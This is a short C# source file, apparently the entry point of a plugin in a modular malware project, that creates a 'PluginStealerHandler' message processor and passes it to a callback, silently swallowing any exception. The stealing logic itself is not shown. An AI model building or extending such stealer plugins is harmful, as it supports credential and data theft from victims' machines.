

using System;
using InvokedCommon.Messages;
using Plugin.MessageHandlers;


namespace Plugin
{
	public class Plugin
	{
		public void ExecuteCallback(Action<IMessageProcessor, string> callback, string PluginName)
		{
			try
			{
				IMessageProcessor messageProcessor = (IMessageProcessor)new PluginStealerHandler();
				callback(messageProcessor, PluginName);
			}
			catch
			{
			}
		}
	}
}